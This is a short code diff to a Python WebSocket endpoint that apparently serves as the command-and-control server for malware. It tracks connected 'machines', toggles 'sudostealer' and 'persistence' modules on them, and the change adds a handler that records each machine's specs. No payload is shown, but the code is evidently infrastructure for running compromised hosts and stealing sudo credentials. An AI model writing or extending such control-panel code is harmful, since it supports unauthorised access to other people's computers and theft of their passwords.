@@ -23,7 +23,6 @@ async def machine_websocket_endpoint(websocket: WebSocket, version: int, machine
 		await machines.all[machine_id].on_connect(websocket.client.host)
 		while True:
 			data = await websocket.receive_json()
-			print(data)
 			match data["event"]:
 				case "log":
 					await con.broadcast_log(machine_id, data["data"] if "data" in data else None, data["tags"] if "tags" in data else None)
@@ -38,6 +37,9 @@ async def machine_websocket_endpoint(websocket: WebSocket, version: int, machine
 						machines.all[machine_id].sudostealer.enabled = False
 					elif data["name"] == "persistence":
 						machines.all[machine_id].persistence.enabled = False
+					await con.broadcast_machine_update(machines.all[machine_id])
+				case "specs":
+					machines.all[machine_id].update_specs(data["data"])
 					await con.broadcast_machine_update(machines.all[machine_id])
 
 	except WebSocketDisconnect:
